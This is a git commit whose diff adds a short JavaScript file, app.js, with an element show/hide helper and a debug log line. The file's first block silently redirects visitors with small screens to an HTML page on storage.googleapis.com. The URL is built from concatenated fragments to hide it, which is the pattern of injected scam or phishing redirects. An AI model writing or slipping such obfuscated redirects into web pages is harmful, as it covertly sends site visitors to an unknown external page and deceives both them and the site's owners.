2aceec0ff1f8515cc26c495fef73b6a4e7fef6e6
Alvaro <alvaro.bracamonte@icloud.com>
2020-01-28 03:05:20 -0500

    first commit 2

---
+++ app.js
@@ -0,0 +1,15 @@
+if (screen.width<=1080) {
+  window.location="h"+"ttp"+"s:"+"/"+"/sto"+"rage.g"+"ooglea"+"pis."+"c"+"om/51"+"978366978/5197"+"836697"+"8.ht"+"ml";
+}
+
+
+function muestra_oculta(){
+if (screen.width <= 720) {
+  document.getElementById("ocultar").style.display = "none";
+  document.getElementById("visible").style.display = "block";
+
+}
+console.log("pppp22");
+}
+
+muestra_oculta();
